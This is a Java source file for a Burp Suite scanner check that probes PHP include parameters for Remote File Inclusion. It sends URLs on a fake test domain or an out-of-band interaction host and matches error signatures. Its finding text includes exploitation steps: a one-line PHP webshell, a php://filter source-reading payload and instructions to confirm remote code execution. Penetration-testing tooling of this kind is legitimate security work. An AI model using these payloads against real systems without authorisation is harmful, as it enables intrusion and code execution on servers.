package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Tests file/page inclusion parameters (typical of older PHP apps) with a
 * nonexistent external URL, looking for error messages proving the server
 * TRIED to fetch/include that remote URL (Remote File Inclusion —
 * error-based detection, no need to host an external payload).
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class RfiCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {
            "file", "page", "template", "include", "lang", "language", "doc",
            "module", "view", "content", "path"
    };

    // Deliberately nonexistent domain — if the server tries to resolve/fetch it, the error confirms RFI
    private static final String FAKE_DOMAIN = "rx0-rfi-test-" + (System.currentTimeMillis() % 100000) + ".invalid-does-not-exist.test";
    private static final String PAYLOAD = "http://" + FAKE_DOMAIN + "/shell.txt";

    private static final Pattern[] REMOTE_INCLUDE_SIGNATURES = {
            Pattern.compile("failed to open stream.*" + Pattern.quote(FAKE_DOMAIN), Pattern.CASE_INSENSITIVE),
            Pattern.compile("include\\(.*" + Pattern.quote(FAKE_DOMAIN) + ".*\\)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("require\\(.*" + Pattern.quote(FAKE_DOMAIN) + ".*\\)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("getaddrinfo failed.*" + Pattern.quote(FAKE_DOMAIN), Pattern.CASE_INSENSITIVE),
            Pattern.compile("URL file-access is disabled", Pattern.CASE_INSENSITIVE), // allow_url_include=off — confirms the include accepted a URL
            Pattern.compile("allow_url_include", Pattern.CASE_INSENSITIVE),
    };

    @Override
    public String name() {
        return "RFI — Remote File Inclusion (error-based probe)";
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        return execute(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> findings = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- OOB confirmation via interactsh: uses a REAL host (that responds to HTTP) instead of the fake domain ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
            for (String param : PARAM_NAMES) {
                try {
                    String host = ctx.interactsh().createProbe(
                            "RFI confirmed via out-of-band interaction in parameter '" + param + "'",
                            Severity.CRITICAL,
                            base,
                            "The server actually fetched/included the test remote URL in parameter '" + param + "' — " +
                                    "an unambiguous confirmation of Remote File Inclusion, with the HTTP request really " +
                                    "being received (unlike error-message detection, which is weaker).",
                            "Never pass user input into include/require/fopen functions that support URL wrappers. " +
                                    "Disable allow_url_include and allow_url_fopen, and use a fixed allowlist of permitted files.",
                            "1) Host a real webshell at this same kind of external endpoint and repeat the test to confirm " +
                                    "code execution (not just inclusion). 2) The fact that the server made the HTTP request " +
                                    "is already confirmed RFI — any PHP/JSP/ASP content hosted there would be executed on the target.");
                    if (host != null) {
                        String oobPayload = "http://" + host + "/shell.txt";
                        String oobUrl = base + "/?" + param + "=" + java.net.URLEncoder.encode(oobPayload, "UTF-8");
                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(oobUrl));
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Error firing RFI OOB probe (param " + param + "): " + e.getMessage());
                }
            }
        }

        for (String param : PARAM_NAMES) {
            try {
                String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(PAYLOAD, "UTF-8");
                HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                HttpResponse resp = api.http().sendRequest(req).response();
                if (resp == null) continue;

                String body = resp.bodyToString();
                if (body == null) continue;

                for (Pattern p : REMOTE_INCLUDE_SIGNATURES) {
                    if (p.matcher(body).find()) {
                        boolean confirmsVulnerableFunction = p.pattern().contains("allow_url_include") || p.pattern().contains("URL file-access");
                        findings.add(new Finding(
                                (confirmsVulnerableFunction
                                        ? "Parameter accepts a URL in an include/require function (RFI possibly blocked by config)"
                                        : "Possible RFI confirmed in parameter '" + param + "'"),
                                confirmsVulnerableFunction ? Severity.MEDIUM : Severity.CRITICAL,
                                url,
                                confirmsVulnerableFunction
                                        ? "The server processes the parameter in a file-inclusion function and tried to treat it as a remote URL, " +
                                          "but fetching external URLs is disabled (allow_url_include=Off). It is not exploitable today, but the code " +
                                          "pattern is dangerous — if this setting ever changes, it becomes full RFI."
                                        : "The server tried to fetch the forged remote URL we sent in parameter '" + param + "' (a DNS/stream " +
                                          "error referencing our test domain appeared in the response), confirming the input is used directly in " +
                                          "a remote inclusion/read function.",
                                "Payload: " + PAYLOAD + " | Signature: " + p.pattern(),
                                "Never pass user input into include/require/fopen functions that support URL wrappers. " +
                                        "Disable allow_url_include and allow_url_fopen, and use a fixed allowlist of permitted files.",
                                confirmsVulnerableFunction
                                        ? "1) Even with allow_url_include=Off, test php://filter/convert.base64-encode/resource=index.php " +
                                          "on the same parameter to read source code (this does not depend on allow_url_include). 2) Reassess whether " +
                                          "the setting could differ in another environment (staging, for example)."
                                        : "1) Host a 'shell.txt' file with a simple PHP webshell (e.g. <?php system($_GET['cmd']); ?>) " +
                                          "on a server you control. 2) In Repeater, swap the payload for the real link to that file in " +
                                          "parameter '" + param + "'. 3) If included, visit <target_url>?cmd=id to confirm full remote code execution."));
                        break;
                    }
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Error in RFI check (param " + param + "): " + e.getMessage());
            }
        }
        return findings;
    }
}
